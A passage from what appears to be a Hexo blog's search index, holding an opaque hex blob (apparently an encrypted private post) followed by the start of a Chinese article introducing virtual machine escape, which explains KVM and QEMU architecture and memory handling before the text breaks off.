9a1d1e8d22fd04708647bf6509a6c5a3fa5fab77e3b597b82836041576350fbf0183a741b033c2afb45ae9ea201d1f58da27c5a2313701e586bd6dbd5d4205db61021ce2ea5434dc66a51c25ce4c080e506b47aaa21f91290c5baf51e06dbf6ad8fa7b1b18c4ea27a17a7406d34fcfdf930a2b76ecde9fbaf550acc49acc4abe9b910cd8167eb4bc67c5a3cf6f2d3336734a68494c5d02550e558c30514e62a9bafc3b26740d03eabcb36e6d111bc99a6754b9e5d8405d9262532a996eeee79809044538c0eda165b4fee1ffc73734edf6f9e700433d801e4668da220e0850a877f76791bbce10f538664447d08f88cf1590de0298c5298dcd9999c37531f85e3dff9da59b7ad23b4d74a34fe121a03245a6fb8db760c098d9c27a1a982458a9850ff6015b0391a5a22b26044ac61bf293aa639550e145137aaa46436d6702488d07f8f341c6b37cb974c53ccd43ac23bacdd4c2df31c93d9d7c43baa69e2edef831f1b78d58f30883f783a2b7c25f484a9e50915cf4a89d0765188da8688db3ac1c0e7eb26a858a29db27820aa234fc2254c937e8b113db856bde153bc6c2ae79fa499de3fa6d8475b8408e8e04a9f843f9bb5d4f76a284c877a98a6815e282ad6a686c60f4f1a1d16a155f5fe6d783fe04a076ab4c9aa2a0913f468711ac77bac239cabc057a739c61957234845f686f8a019f6f9d03119031c739fa90fe052aa318da4d517de74292c2ea3cc9929c02776143b0236a3c87fb1268404a0afeded487d2b1c1813c3a88ce825d32881a9d98ec24aeaffbaa807b04484d69aac7675c7bd9dfdce6a733bfedf1992ad81b5da589d965bf0b542a12a49bd928e62513e9e4276cd7d069b92249683094ae7de958a0f74646bf24569491f3d01f94c5e1673e847943132c4926d1f328826d9d9a80a57bafeb122cec0f713fbe909d9a2aed2465f724f3917ccae6f637cb4654ea13abffc7893a25a0108d25ba160c71623861a4df318642e559378cc07d360dfeee87fe689d8a5f8dcb0307158d4a05f84c17005b1e1dc382db962ccd2a3b0ab988894db74380cef4a25ced8dc16030fa8ddca361c3d97a03e3cd5bc10adc6584ff44d94a583ac43baf6f437cad577af41adac85472e3f4b118054eca6103032e84c3bc2c040e8cacb70ea8a2427620452624c98265d0108db5f093910ec077933c2cb1984452fc3faab1629d0cdb4458cdfd66fb36f01a57bea11c0588daa3a63ae2b3eaab04110281c0c70ae33a3a4c2791be51d1f1cdbea4e8af15b6ea89f912c0ff3ed20e2ed19cbf372b90f0616a1e2b7b7665b24a9747393ad4f8fcf9bc06dad9db5d79f9feeadff23ca2fb640950e555f4c4dc1f55ff3e1f08b419cc258ce478e546671b29da07936d181c2e1d7574cf6004bfd5954c124355a33f7a7caca50455745b12c8793dd0d3511f068558fc680626431caf8399248787b5cc2fe17f368c4b9edea252ef0a4bdc5f090241f4c5501831554b6e1a5fddf1340b1b8cbe49668e59091e8b6fb2c41f4acfdba7c27b4b2693e5b87b61e7abdd7743cf96c1934b3d251a172a59e67767bbc12f91c878a275873795f55b445f48163aa76c9bd2d5ca789b487b6b8290e10894a144e6dfff3691fa4cd6f7d01b73f9ff18ceafc87e2b93c0f86785dd86bc2868e554b3b36a2171f0e8e249eab25069b70c7effd16cf2c858f2e44aafab4eb19a700112842a2bd0522b955ba13b9711d7a728cd2dce02c797b41461e5930ba8bbbdaa5f5512439721e7e80fb4cbd71b3b7b69733b896882b9a66b33093beba5a2b5a3b6574b22c3db47af8b14cca83135febe03ab0293a2a02a819243192cfe67c3b535fc3b8c976e753e6189245faae105d3be7a4adfa7bad9c1704aa989313c9065ba23f41670848b08c227f41a0df5e843705dfabcf8a4adc658b799d30ec1ba4bd8947bf33f5168a3b7f3e3d9bb522faca7ec08cf43631cd5ae2bee1fabd63da67f623f57290892faf9602d1128a66ab11548f0a77f689b73f1a9e852c716b3b453e75ebcf835447b0c4f234d9f363a6882c51c1d961ca311459af820477000c31610aaeede0518aa65b5fe598c7400b464910de9b9ec04d09bc6459270bd15e7a03abf6af8e12640c0ce90945716f447fbfa2863d71f93babc3741fd4099f28c5ae39d8d6b00c06c177e75a6620b61951739860552f5e604ef85d80dc242632fa718f1aa261c54ff29bd611b8da1a2e5cad20bb0eeb99debcb23a1e51543ff53faa8d71361b9632be22101d352512876ce7775e11b82c14e815553e2a09fc133ece4da5f010be75aa94289341ea35e9c1c5d12d1f8fc61dc7756db97f2061767c6ce543b2bcd38b1d0da088086c5b5d03bf1939c3b4311823cc6b1136f54bc4e690696f3494808fcb3baa9a59d3caf0de4ab457f2bc6bd8a8a4aeb62078abe8a1a2ef9222c2bf8906d8d35c21db5cd7988211cca2334be1438407354f0d95f9c8c448f19fd2dca1b482ce0006922a3bcf5065a570b5eb8a970056f31d4a7b0925dac4c3629764bf7ef050cd6a6bebc05066d131f7a986b1272f65c6bd36ddb70a11f475e44838628467b94f0e3b36daa23acdc75ef82926ad13eeae89ecd678b641990be0a0b00c03603c79e00ce1ccd176d1f92357941b1b04cadc507d54528c828243ec43a146526e8e1c0a873ffb08584be19816b737313b40ddc33a12419cbb5771d8481b9a8a5f9a16dfe7482a8b4c35ef2028ff171c621ba66ffadb831b4736eb5907efe321dd02784bd060574ca8c545fd77ba09401a6b9b4fb990e06ce1835a7bab8f1b6f002437c4adb5350dc7de7d10c55feb40f80f43c5986be89c3175d1c647b2e349ef7a3b022fc3da9b25894eed196c46d1bb257b2da8fcfcf133dc2608f646992d19f1548c884b068573841b54c6754e86c4f079d27513b6fb281f967d50928a776a8f4c99aa450e9ee69fea834d000fa907c0617dabe971540721abb6d0158a3692127a2847e28417299b0fd98cdf79bc1b8c69c9f416eed4a31f15c10943fcaf17c822316298c5dcbc3ecd9e4df4e847314338229ad3a7beb27b3fdc3a5d65c175d59e32f9e54ba9e7227ec8a328578dd3c423bae01da108501e351ced4f6923e05ec2d5a6967aeb0be8f3381ffc4d8c348b9b43b1b43f19afbcc9faac80f4121313701f06837758859f6f28111795c6a72388374bce61d4a4d2f4b114ca17662af9c35c24580a02ee1b9fdb2c70e552c7cf9267a114526f4dfc087c449444bc9c372890e514dc013e7d5148849b433d1df32419fad4c9b6a37d0daf29089d14bd9f1e5b16f8594da13eaf277e24ac4897541865b9935b81cc13745f67da3c45eb61a4676d7ba71c9cb59a02eab530cab48ee7cb8e630dab126e11b99656235f03a146326240db70e13c262e731b69e84c9b2b861aea3e63b1bd4f28fd98f9b58c96a6dd912e545859108d0c505957c8e2c4176b22298acd9dbdc904e6440844fbffb7fe704087a461de4c401c40deae974abd010c187ea8f106e49274dcea406ffc10f320c90d4e47870e1cd107bd4e5b18d71e74a26f3337490ef2b04a35e988fc8c42e6e3f948dea122e0fb44b0a765c9e2961e4634090f24fdd0132143593de770930fc73582684d0d229a43895f8f9f99d490a92d019933cec35dd1242c0e41f0cc45d0c8a34b1291cdeb9b5fa54733417d94c6d630156dc1690941c758b0998c7906eeccfb63770eb1027389104ad34af34257698481a67fb48e6615d1d5c7fcc946f80207f3d7298b1a99c03d04afa8399bccbe23551f5412396315e9703d2e7ad9a52a24b6e04dd3796eefa0022c88c027bbe8925e21bc76093265ac8f33506d34288c91a53a4048e32922d3bda570193c924af7e8271cc2322c7ed1d7077ba67eb7ef14bdee2a7e98a13168a03ad12ea42a219f49e245bac1161bd419296b4843d6ab4c4e69ef9e92a1378171e83f2870c3e770d3bcf077e04ab13cd80f917be6a7fad535e80e92a314efe1ea0e02700dd33bb533ae985929ee16057e70662a46d46c20c02e59e5b9b1297ca6e9b1e6d95b2545042b6e9f55ff6ab5c4000c02cd6c7f2f966f468995f0aaad9942a0eec50341f175d106815a276cf23dc9ae08bbcde4764baaf196a16b884e3e57893a93e6da681336c28bbeb8f59e36da8718946c5cad7ebac4c729d1b743d8d5e7f494c06a05ec22dc91d54ac92d15d43132533f71d077f393d27a7eb85aee1a6d269b91c865bf728a59be8ba6f467ce2ad750e9128993b36bfc507cb09237aad53f5376ff9ced94073f320ee9a843eeaeba37100ecf8844477f2834ef0f99b5a2bcff7c23cf9262c558e5b50d6617fe0ea9c9c08967d7cabcbaecefa8ff90c1cd19049ad2a5e64dbd8107dc714f65b11d8deb6a6a0ea9bdc3d4a58bf316797d38cfc9c0b57916fcdf6b07c88e91e413a4994c1f18327b629688d13f9bb6e940bf3acdebaf48c62c8725eaff602702ae0d69ff0c009b3260690906a86efde2c677fae048a85aad56395a5191b31a1cef9e56ba3a6b688a683762fa4011400be4bdc09bf3cb75b92df43abea5d440f23e055a7f08bb6ed555e52a425d7b8d6ae599e8ccd290854028f618397b7743dba0f9f480219c522532b10ba3a0438f60e7450de86d1d7e973f1d585ed876fce373798661f01e9a193a4eb229095e51f158228f30c25517e5f179c8d6c9955f7bf50cffef511faf516e095bd816dabef5f8fd12dc18e44b24489233e3c069d3115a73e3aae91272790cee7100a4bb1a9dc67d9d7d9143d687618ad7b41c333414e7897a021f5ce9785f960449f19d292ff7e052727a1da7915fd36a716a560b82dd3efd8d228ec94bc6aaa06e30f7be1b32af3b463a6c5d54a20c553e3d7c5f624ee97b6bcb203958b6c00200f9950430442ee18d96968658af74c7b96da54f4a67b6288e82199d4ac4f154c9aad1adb4063d15285d7b0537cca30ea788570cdbe747fc79487b7f4fcab80fd7fc1bd7efa6bf8f64ee8088872ea1e1801664fca825bb56b25fb6f08e14c30ce40c86926fb5ff50401e4aee46e92b2adfdb2bc2e592382e9661402802086a522e41023a4c9a25766b74308c9e9d7e0361d7b8f109ef298e86c9a609e4961ddbb803e50d83c34c37a4564419df741c2bac078743cef2d39f8d89d56ba32f08e99539c808b9b524420371f6b54af7adae4e12be751cee7ca6ec708bc7feb072e2d91bc98e50d047772f18f52e67289274264eb4df09a6f81f9591470d0251431d7d5e26a90fd7d61896b55e8c239196cd398fcf932e08c492b03b9d30f20a5a3ac287c08f7ef2fbe0f3aaedf514b1d7dfa22bcbcbc8995216f3babc3dd2256651f8481d1c1746c0f4150610ea912f2646e503bc5a240b9dec0dd7557fcd3ff25b4366436c39c7d52eb78528092fdf1fb7d627288cfffe9f0369f8b5feeb9623f1fae89d11a66eb5fd2582251fc49938ea6f869423e2a7cb5c8324c3e3d82e20f68d7346ca892e3e85fc13274b7cc529ab03a21a0df5c00dd7628706a7c3021ce28111f171d3697408e96351efaec4adcdd9c454d1a8350b58c2a5b96cfdb592a66fe1f9ecbaf564ea4b5b087d01abdd6e6af20f7248430f928d975215844031e4e3ea36329f7eb53e8afc1677aeb692fe523d4f8f74d6ff2f1ad07ce11fd0c9dc68220c92216699a8e06829458bf5e0504a0483ed673bcc937e359ac7cc32bbe33ef7857ad6fa9612856984bb4a2e92eb5c74f1b26a985d8b00bf066df08cb0990aa6506dc9490aa8b5eff2b119c638301d7b6395633d4231c42ef7f5c0f5f8669df93b87a9e5e87455cf7f9bdeaa2e417dbd9dfe5d5be2abd82350db90c8b9e7a6f6ea3524e16021fd60e2d6d00a2309708902e0ea36ba7e8460a2d0ecc25b15aa3b886921a97736b0193b76eb55cf8053599b304e70538e0f5758f3b65d036fe16e663be5aec6d5e75b98f47e2fe210dd268b12009972f0b9ce8201a93ff699cd6ed7c891e09ee2dc8426ff2b3cffab43be80ad803a66786e2a2047c0557cf9f422433dbee33f8426fec48bd3e15e5ea7494bd2d614b4365dba7ae991622d7432b588f644007139a90c913fcbc04da73508ec78f5929bfe11e8d508791845a668ce1b812f1a5573287246ecc9f363eecd149cec548d7d0de368cb79c81ac19b7ed79588955769312fe8f94c00600adacdb5b3d111d37053688bd670077c7a19346d22f39b82c24b4ac8ec5ce59c5695771663eb1ce836474605fae6389b6c84c56e39ce1d481c5ef2e9f392080234b1abc5bdb5dd90882ff2a20a30dbd32ec70f7210ddd17be52b9297e81e42e3e595a5208f2600e36b1673517a0278af8fa167d7aa5ddca4a80f84dc7734bb64c7d6bb98e1b2e5cd5285fccd4562591647c1c19d9a486daa5d62a301798ba613d93b4bef97bda6a657bf293aeedf46328ba8f9d9d0bf7cfff7a9d9c1f93ae9906bcc3dab7fa3028a04e721c8ad555dec614a7e21fed6b7f4e626d8dd4b9389a8a41b16b37a584eb483717a1e0b64656cb770e0b689573471938bafe4225c6fb8e82ab25b9290570f64edf0b88c5634025925a8ccdb7fc89fe7cd41e1404ed27880f1584e7d0888f8d2bf804e056ca2279721f7e6c76bd5200d068d9474d3dd536fba6ffc8d3f20991a4bb6c4b5e7d79235f4ff077c3a6fa3829f18ea4f71337584c36e3a0fbc7e279dde7e9ea0d00c2a1be0d852107aaf7735e04d1769ed4f4f23ff39aa16d545ccd9270bb1c155f6e9d5902aa5ee8f5f6a5353f3da605463cfeb3fd48ec1cb020740f92d70e94309c871df0bd571e2b5062a7e315e5b2c7a68124d2a9496291adb0d1895e9c125ab70731c993a77751053086ff016bfd11fb0764169b3bdbe433384406cedee129c3b4331aabda8e18864b3f984e5b515df43ccf88c762ace46c8f4572d11013d2589468c598d5620a27143229512bb655e5fc25c2011b7cf0925dee5617a4c62a3d32668c56b9335f5cb6ec51236a5c2f9f3f8fd33586b072f3e13b4eda2aae4b9c5ccaee6e0bccce58a6e3e07a347d4c0f52197c69838f3bbe7a6cad123cace5a7340949686fabe3a43541c85278f3292e8052944cb3c528381888e16806b8d30174380be8295cabf23d3d8a3fbbdeedee4adbfb0aa5e9d61ba9acda13d91e7b20cf515987d4fd804e4faeefa67dc368b7e4f6d4d4ca36519649d88d164aa61788dc78e1bbebf3a0eee0b58a5a233d017de55f2e50da279af7c574ce2520fb351a5fb79ef44a38d7c4b5836da99a47e3f37a477406fec7a03f5a1abe8d23db83ca07162a5ea3f7401c83661af83bae3b890cbac77fbed13e9f2aec959012f07d810702d7c0b099790864e98957952509a22a77dc046ebe50c67ec3157b256ebe44dc6a9a7f99767c62f35c115f0d89b2b65f9dac02c2828373e1d5a7cfa0b15655d220e22906ec1a583e9d9fed36edc9dd1688f4f4e8ac98b83823d067c298c74f25a4cb784f2e79097218c80bd87807c7fe807f8554005900525b0fbc754cf016944dc147e218509712e17b510ffdc7f11494d59309840f77abf91c9b6f38ca9f4abe7fc421095608bfd345a051ff3b5605af609c37233c1e4f021ed824027af104d8d19317595aff08dff027ecde22878d9762fe002423544c8509f65425244361af60aca344926107a1f7e387f9bffa533af8c3111d17491871448a519dfb3708818cfeeb9060efe31983cdeb8e4c2d3495ecc2fe721f479dd6c20904fff6eec416fed9780dfa8b02dbee30c185e3e76934c8f7a78057cfa4059096374c4e8eb7ca0b869be0db6eba4174532ff295def09b80009744da4b38c2fec7a1d1b615c03074610747f99b2331aa7fc39fd16bfdf36d7f9de76e29c49bbf7118e715e67b255526bbdf615e61732487a33d0d7e13d9a31c21d5ee3f962d79b3d57236f07cffef25d1c02690a7ff7cd62806429c9d832a17f413707538addae61557b1f28fdeed1464f7cc477f362fc4fef34f369ad59851943ac578f69a80908855658c09283a053ad703256eee8abe1b029b9723a0e3501a1c32f0a8cb94fdd27fd96d1abab7efd07dc24f57fdcd166fcae9f066cf5c3a2d5c1ec19bc03247484366677b6949cd250b03834b5fd6013f928a10fb57bf9668072f0bf5da91979a1d19eddb87bc98304d7840fd61882b5d07e0a5ce38a1a9adf4d73616386c92085ee666172768913ffa5243c28a9bf38aad3553723fdcbb5ce304cb246b6ec785014ded4f107dc57799d6bbfb8e6dffa1dc6cdd367aa89b7a623e6c42156446ce69c7ec12cf2850835061527e4d6c13e6357b5f834b12d23055c545d738985c9e6108bbac429a4960f337ce94ff648185716586c992bdfcc39e11310ecc7b94e24a1d3368e360a4cb2928572385e9fc26639308089274df97e87d947166d4516d1827a617d190717dca056a4849925dd6ce715088bc137d2f89552e0da228fe926692e9e52db90d42af1a8d666b14b5bd2047d2ab942cea18ef68cf3b61638b726a1991214d79c641ed98e3119b6d7e9addb98cb8d8c869fe72a149a97d4b6693c2a8d6193a0d9194765cf2628f28c5a72c77b46bf9fa91090bea6c32c1cc021d7e3c0042f077d670a401e63e723cb8cebdcf8a35ecdef9b3fba25d7e167af84e11dad7602af8ca5101a46ae7bec0d922fd066f6867b32aaf4e364d7a089204d6324da7a7b772925153b16839acbef38c8edd4205bb5f8c5a3e71273c3165c4e931cb5a11bc12e2c420afd345c4f91b8f8e693a7b102cdae637bc6784936539e2ae11e4942d96384201915b959aee12f60aabd500632f4af8387190c14229982be2a5efac544525636bd1d9138cd657d67d53d48c52c4b7b7930c782b78b7e223e4298f3e835fc85548a526c553d437107feb92711e81dcb42a21d22daee824e4f58874825450c0a0136971caa6d1f957b53cbf151da202064913f5176dcb1012ea75cf4052ee5d1e0d8c2e157a5515541c7822ee47f377bb18747bc48b5d3ba0587e051c02c0e866d7f0388b77098ba6fb0862c3114f21c3508fbf53a7d28cf778aa349ea5771ba361076af3992396ea6330778ec1adcf818f108f3336503db33db269e4beecdaf8799a2ee6529a9116a9f68b5a8f541e90cbbd76f3c5fb4e3efe23bcc2ec1a117d139d13f45bedf824ad1edf2023f0ad52a0b8e02801bbb8621efbfc03450da42d8dc0b08d84085af42cd12dd9a644db749d8162a2845619b902046a08bf9b3afe9b23e7ca10ca5dcbe418a495225ae06c27fc690db2efa55ee29876830b8ded81670563eddd24e42adf75c3660d8006548beb0a6d2f69222fdfefb84b2995c46557eae7e11e382f1d9cdd8f404d1b8e7d4763207d0c8981fc0636fe9566671c660e3fe285afbbebef976037392ef829c8e3e7780a715a36a1e67550e10502ac6236ee4a2057e81f4c3367416ed7dc0b94fa3d8a006c1a8eb2c6de599f7ad9e5a7c87ec98fdcd4608adae9cf750a692588744c93a07e16eb96f78c425600a27a389f75e4e692334e3ed2336be139bd260812337ae888c6f5a9613da6b279ee8573986d4a32f56ad24f678b0da324b79be6b0478a548cef3ddff1bf32436466244fc572cbab1e39e48c50b39be20aab41b9caa5402d36f90d52c1da14453b025ecb965137ec8bab11c85751d906b9adff33002814b6b06286bcb608da874eeac47677f544c81b847693a12d79be1d2cc5a1801ae1472bd54d8452e521376aa359125bf0fc812dfad0214e7a9edc527b14c75b36871336c3613c0c83ef802662fa63f51586870cb0a2839ee22f05601e4f2dcac126c0b4282dc7361509758ecffef04ab55ce587ae0878ff51d4d933c8f3771ac7772f4618327b927450282627f69722699b94bd3f42f1897efa324e1d9a437dd95cb8bec8c491041afbe4c82773faf28f1a461f86bcc4f363f6e77cfbeae6140edc9503a0055ef3be31c08e5b69bb7ed0fb8da3637ac8c738066d0a461156b5681077ac6b9950566e9a96c771683e472c7ba282747e71c6e51e11079a7df291cf80a6e7f8109c3032d4517b2850451772c52f042fdd35247fd31ceed37a5b0e18df1481da94eb305116583dfcd9ba09ccb05a77785e2d1db6852aba2487b80fcb9f5295db19ae714e8da0dfc17df88de982e4bd1745c3676622d72746bcf2a1640e239f26e4151976a526231dd70347576a8ae15cc3b97a88a631fa342c13b84fe947f465f4818643845dd77935bc5615205d5424d1addb49cca23e2baaf5ca765d585aebc07730a860a884ef002b4576a66b5cff4758642348ef3e28ba005a82677355e07ae952b77db591440c94523cb6f50c86eedc0ab1a51ea1d3a8cf29405f8bc8be3c84ba16e7e560a6c34e3a4f280abb1e84d0c1f7a8dd5b5fa676ced836871afcfd739f0cff4d724ff220301ffd47c04df2d25cbcf56719ce7f6c033778ebe38cfcff071ae4ce5043bbbac6bfcb89585716983269090119be3146d287c370bccffb6ce37904fcc790dd300d24fa552c79aa570eda6a815f44fcceec74236e02d7f22151c065a4a282ee4c448de072a58092fa57dc635584c48a69a73294e367f1977acfd42efdb5bcd183243eeecff37b2900351242d4f2706cbcd678751013abcc8b70d218c21d1d424d2e85e5037e3fcb2f0fc0ef81f0782f96816bf5b05552fe96b75c234573a36e800d3ca850989af94c0f0d5b2d08f9322a668c5ff6c7f2c4c1deffa18f03613859a45d1bc6718836de3e5051bb9bfa618adfdf99a5b3b532343fff924c84d865ed5775bdb50e96f78b2bf9f1aff01fef1cc3a9f5c5a76b75d3ea14f7f991cb8cce2a9ce3165f64475d57544c37049aae5a7443053fdb59bd49beba32044cc2a483268344a5537d43ce15973f4f97e200301fbb82fbfc8670c019180b3538fd643869d898443601695edbd4f162159bc1160acbc90982396853349837d977087b690c3c6660e8b350ab481b60933fcb780e4077619102c6497361f8c4590e9aeccfdb79039f8c6f6e983cd88560db484a5e19570adfe7e6416d4d825aee4cdbcc0fa9ca6af356e90b1aeebf35dcdd3a50849416cb019b992025bfa7a717aedf0bbdb1c031dc1587f244538326d277e4c18ce1ea337ed8108b7f1d559ed6ef1312723dd66fb108d75a3eb8d76586525d67183bd6e34e06b2143f7fe938fbe5d6b75d429842b1ce66c6974e3392374a16d60ae90f1e458b61600e29d439ea965c68350f6e05683ae1bf87c6be777f80971c80731bace3f3c1d94a49e4e77a2632f858e3e788126243d730e296cbaccf7150ae9937764e2193a51721df97e77f8b7444b4463a5b27113b7a27fe60551b72d2395999e4015c2fe94fca7ae1973bb2cff10025849b5c4e1128c66b98a0d4e8119a9278bee23c59d633de2aa6012d2521e94a27ee5acde309bad432471f513499c5ca21f6d5ce036ad956f2780e189a2ce9e5706bf5e594b7f937f4a53f0f3badc22d196253a80a88489c9cd7ad80996818bff69f52b412b15b54f612d07df19cee1d98797ea3d859ed8a29698190bda81755086c8ece0c066f013193ba928ce649b68b83126562585ac1261d896978e721840f554a2fcb3416ae3466a5c2edeafceb08a722391ae1c8858fd713b3919c2de7ac05e6a5ece645c6907a93258cb80a6cc002d3e1130805078f8eff62c41ee8b5f54246b2c5157f2e21c2b47cc995dc4dc493488dbb914ffa1f399e8b2753da6762158802bd867e712fbb5f02b9bd1a7922d2e1b32bfde39c0f7a9c0960f96d5b05e70a707950e6b98ee591216dbf65ad003a6cadda264c334506f4745d3c6bc2628d67e079bbdd3e7f8383c530ac7428df074e12112d74573a2340a0bdf655b663127d3046b3dcc65ebf285c4c429936123efd4b4bc8885d51ac067525806a2afae963e040ff77de44870c94b11dc89bc0a7f1fed6313b8b8a1655129be3af623093b8f6034a40eff64b6f2014eb2416fc157092e999ddcef768d7f8920ed49791ee7cf3060da542614897f947a09140e890ba5832b0a55a566776948ee669e48c6c134b5bacfde678b6c7636881ae09a474198f0af38da6c70b854f883ec5cbc81d50d60945fa1d7d26141f0e6188ba5e3e65dc984bf626f58da2137b1aedf34ed2e242d5189d43b4906fd41f68f2dcfe1f645a31cd1f643206a4ffebdda8f20112bec05c2b678bf71e74759f80e4300784ebb4d4514bcf3f75dc7d716b8b65cec4c21c399debfbe199246fec3805bf18a7b3e5f504115044899e9cb9685c58cabff2cd30bba43b219efebf8b70e14da5835d72b30fac5a6ff75e92dcea4ae20c71647e397ce4f550411060f765e7c6cd11ae4042d8759da4bbca2d2c1d6a896d70a6ec317d4d8d136ee4d2e0c1c372fcca47f8285347f155bd58c12a9d55ce157341da8e93ae3e912d94d2067453f1af89c6f95e99060df961651be01314b315dd157b8ff6f76447bac9f56053fc3d66fa23e6a0cab22cf8c1ab46e1a8aa1f0101bcb449e7446cc27d88321e67d46b5b4fd77dc770573899dcce797adb4e6e6c2871ddb0a2e263d9a599c0b9ac47153d5f071eddf5ad28d668a6891e8b0a9368edf7d3656c0f695630b0e7215250c8fb37df7f97abb0a43aab6842f8c9950e49827a3ca8dfdd6247d6dfcf0109db812818c43de6e1adfac567560dabe681ba5c3ba5c8770b5dff9e2e0dff4e034602966893134c1cddfc9e8709c93305ef51c8d834e4bdde25b2b316f27769116fdd4cbe94f1657dc9655fea215dc2f37e388a79354158294a1f31672e864524fd36243f35acb2323618daa2b6147afa37ac9eff76267ba2f9a9611c3afe6c8e57be453f130126999ea5579811c426438a2a8c2adb3a0108889c35b25ab575dd8ee131bf57d2c959cd7297d615f11c2a08d68e680cbf602585553bda6f243d3cf54dbf7ef4f472defacc3d9b3c73e2f1aa12988860e2976f68fb15ae675acd743c81220207aa57befc8035cf5936cb5a1e5008b691f7f449167e289b4b3f27f9d1d74b472f4b9789535db5dcf12785ed12b3c4e098407c6a6aaec13a3807c8d853d1c3576b3c5b1a47089a43995fece887a19942c8f54c07d7331d07cc8b574fbaed7b7fef37bc3c8a3cc3537c7619b85da18f94d27e4f2ccfdc26dbd49964e55340c96b0223f98ec780ef6164a0d63139af57e95ea40cd58937f03fc091c747c620d8e61a3fd3743be8d99f6017ebb7d22653514a989b1105dee773dede87f007f0ff45b53539893214663169cd336009e039149e2d2c79a1f7bd34eabf13e8ea8063fdf3ab770b9d7470bd6d21026779c12ee7b3d92a67e621668dfbbe34caea65349d43d25467e658431f7c70ce52d90fb896206f8bb0db363ac197c4c026c1d6f2642885959c792ed8c323cb6dee1147f2c820a08bc0235d26dda6dfc74764908893a50feb1961e6aaabc1cb68a77f8e6957e7df970fa5e1a56962c5dbe69d5513c2feb28b1be7be308055c5a95957299596bf106946ff380442e525e7d69d8003720d653972ff2fe68e8160a40f8b741f805a61718702c3ca16da414bc00d663c6231c4b4d4a3ea171a7e3d201405f89ea3981a55a6eccdac72f197b5ff95194f666407b004797ffc09ba018b99aa4bef7077e0dda810ed3a2aa5c2ee3585a0d2ed2c1af3451b40d3232b76a0b1e5cd8c8e4d62da079adfc25f39ccf9c151191d6faeb46402068f4ca3a436a3613eb840dc14e330438cca48f30227e4fd3a5e52aaf2588adee4686011bcf7864e7605abc9a0ba9a0686fbaabb35c76625618bfde6d01de56d8cd713f6b9e9e963e097a5ec7a8ef2bab0ac8da93c6df31f1977e60c2dfe3a9535c11e9f288dcaf55973afc1b28d6478339aee6e0b196a83ef1cacfcfe2dd82663a1811af1655a62abdba26909348f3a29709e407fade926b408e5e6b424ddf85bec6e62a4f8ee08a02a13b3c290ba498f0fbda3d81357e871597565324e95b7415335cf1d89449a3621fb5857bca821a7cdecaeb988d2a6eeb0a753d0170e8535d85221ea88dc594cd860c2b74dcdef9a18399f75de1febfd75fe1f82fa12a832337054bb0e27d2fad9fef1ef771e140a15ca848dcf19d23810e6346c982b5040cb7c1f838efd7a2cf9f55b066854ba4a8e383444fc64b6d1e46e087c1721abd25c1e79ba719dcecafbf091cbd8248c9c6c28e934c202d61f57f47a7d27ffd6d77f1fde5884b9bfc0a87987267c78aa9a7e293ada467b3593c2f25fe7f9310c1f941b9b7c4ccf821b12f6755ba2cfee9083b08780362db1b214481c13a867aa1d2b90b2ebe5e406905dacdfe54b83effcd7df916d36f47fdfa5553c7cace1102cd9979d7de77d63f08889be6f100a15ba5fd9c75e307ba73debe0e046be3bb4b35ef125af6958585955f4bfc2e3c584e752d21793ab3bde126e3f64131cd2e48dc4b5e163e740b9ad684cb6be9e6912821596c0f730f98e9a4bac447a93e06a40f0971dc01e4c57e177750e6ee1a7749b55155e5d66985c7ebb85a0470ee006d5f8d026f5f2790439da2a1fd378e5cf9cbc476a99cd22d10bc6c727fefe7f6956703bf748d4acc6acc42e4d93cd5aec8a516ceb3e7e2cb8335e4569a98d088fa9946faf0c09c25e58cecc5fe15655f3d86d314b7e9281bb121657c254f8884d2a9b7e7df6982091496dbf0be87560d8a98c60e7029370121604a83b5397af050dbf7b6db3e34bb3d692f00042682412e70ba8cde64bf18ea1d165e47d71ac2d010faf52dde719ed7]]></content>
      <categories>
        <category>私人空间</category>
      </categories>
      <tags>
        <tag>summary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[虚拟机逃逸初识]]></title>
    <url>%2F2020%2F05%2F01%2F%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86%2F</url>
    <content type="text"><![CDATA[知识积累：这里只是简单记录一下基础知识，因为网上都可以找的到，再做重复劳动毫无意义，主要记录一下自己的理解。 kvm基础：KVM是Kernel-based Virtual Machine的缩写。从Linux kernel 2.6.20开始就包含在Linux内核代码之中，使用这个或者更高版本内核的Linux发行版，就直接可以使用KVM。KVM依赖于host CPU的虚拟化功能的支持(Intel-VT &amp; AMD-V)，类似于Xen的HVM，对于guest OS的内核没有任何的要求，可以直接支持创建Linux和Windows的虚拟机。 KVM支持用户态进程通过KVM内核模块利用CPU的虚拟化技术创建虚拟机。 虚拟机的vCPU映射到进程中的线程，虚拟机的RAM映射到进程的内存地址空间，IO和外围设备通过进程进行虚拟化，也就是通过Qemu。所以我们看到在OpenStack中创建一个虚拟机就对应一个计算节点的QEMU进程。 guest OS RAM的地址空间映射到qemu-kvm进程的内存地址空间，这样进程就可以很容易的对于guest OS的RAM进行控制，当guest需要使用RAM时，qemu-kvm就在自己的进程内存空间中划分一段给guest用。对于guest OS设置了MaxMemory和CurrentMemory之后，guest OS的RAM上限也就有了，就是MaxMemory，如果当前的guest实际使用不了那么多RAM，就可以将CurrentMemory调小，将多余的内存还给host，guest中看到的内存大小就是CurrentMemory，这就是Memory Balloon特性。 架构： KVM由两部分组成，一部分称为KVM Driver。已经成为Linux内核的一个模块，负责虚拟机的创建、虚拟机内存的分配、虚拟CPU寄存器的读写以及虚拟CPU的运行等；另一部分是稍微修过的Qemu，用于模拟PC硬件的用户空间组件、提供I/O设备模型以及访问外设的途径。 首先在用户模式的Qemu通过ioctl系统调用，进入内核模式。KVM Driver为虚拟机创建虚拟内存和虚拟CPU之后执行VMLAUNCH指令进入客户模式，装载Guest OS，而后执行客户代码。如果Guest OS发生外部中断或者影子页表缺页之类的事件，暂停Guest OS的运行，退出客户模式进入内核做一些必要的处理，而后重新进入客户模式。继续执行客户代码；如果发生I/O事件或者信号队列中有信号到达，就会进入用户模式处理。 KVM采用全虚拟化技术（可以通过给当前内核打kvm-paravirt-patches补丁来支持半虚拟化），Guest OS不需要修改就可以直接在在其上运行，弥补了半虚拟化技术的不足。 qemuQemu的功能大致分为两类： 模拟(emulator) 虚拟化(virtualizer) 模拟：就是在一种CPU架构上模拟另一种CPU架构，运行程序。例如：在x86环境上模拟ARM的运行环境，执行ARM程序，或者在PowerPC环境上模拟x86指令集。 虚拟化：就是在host OS上运行guest OS的指令，并为guest OS提供虚拟的CPU、RAM、IO和外围设备。 由于Qemu是一个普通的用户态进程，而guest 